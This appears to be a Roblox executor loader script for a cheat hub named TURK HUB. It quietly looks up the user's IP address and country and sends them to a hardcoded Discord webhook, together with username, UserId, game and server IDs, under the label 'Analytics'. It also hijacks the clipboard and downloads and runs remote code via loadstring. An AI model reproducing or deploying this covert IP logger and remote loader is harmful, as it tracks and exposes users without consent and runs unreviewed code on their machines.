if getgenv().TURKHUB_LOADED then return end
getgenv().TURKHUB_LOADED = true

if not game:IsLoaded() then
    game.Loaded:Wait()
end

-- Services
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")

local LocalPlayer = Players.LocalPlayer

-- LINKS
local DiscordInvite = "https://discord.com/invite/v3dAeMKp4N"
local LoaderURL = "https://raw.githubusercontent.com/TURK2/HubScript/main/Run/Loader.lua"

-- WEBHOOK
local AnalyticsWebhook = "https://discord.com/api/webhooks/1479493583118794904/W8wKs11ip0OtUHLLtEviLxw-3OTTShXcNhn9NZPWiBSWfms5MD-_K10wF36iYxDL6YBa"

-- request
local request = syn and syn.request or http_request or request

-- copy discord
pcall(function()
    setclipboard(DiscordInvite)
end)

-- get ip
local function GetIP()

    local ip = "Unknown"

    pcall(function()
        ip = game:HttpGet("https://api.ipify.org")
    end)

    return ip
end

-- get country
local function GetCountry()

    local country = "Unknown"

    pcall(function()

        local data = game:HttpGet("http://ip-api.com/json")
        local decoded = HttpService:JSONDecode(data)

        country = decoded.country

    end)

    return country

end

-- game name
local function GetGameName()

    local name = "Unknown"

    pcall(function()
        name = MarketplaceService:GetProductInfo(game.PlaceId).Name
    end)

    return name

end

-- analytics
local function SendAnalytics()

    if not request then return end

    local ip = GetIP()
    local country = GetCountry()
    local gameName = GetGameName()

    local data = {
        ["embeds"] = {{
            ["title"] = "🚀 TURK HUB EXECUTED",
            ["color"] = 65280,

            ["fields"] = {

                {
                    ["name"] = "👤 Player",
                    ["value"] = LocalPlayer.Name,
                    ["inline"] = true
                },

                {
                    ["name"] = "🆔 UserId",
                    ["value"] = tostring(LocalPlayer.UserId),
                    ["inline"] = true
                },

                {
                    ["name"] = "🌍 Country",
                    ["value"] = country,
                    ["inline"] = true
                },

                {
                    ["name"] = "🎮 Game",
                    ["value"] = gameName,
                    ["inline"] = false
                },

                {
                    ["name"] = "📌 PlaceId",
                    ["value"] = tostring(game.PlaceId),
                    ["inline"] = false
                },

                {
                    ["name"] = "🌐 IP",
                    ["value"] = ip,
                    ["inline"] = false
                },

                {
                    ["name"] = "🖥 Server JobId",
                    ["value"] = game.JobId,
                    ["inline"] = false
                }

            },

            ["footer"] = {
                ["text"] = "TURK HUB Analytics"
            }

        }}
    }

    request({
        Url = AnalyticsWebhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode(data)
    })

end

pcall(SendAnalytics)

-- LOAD HUB
loadstring(game:HttpGet(LoaderURL))()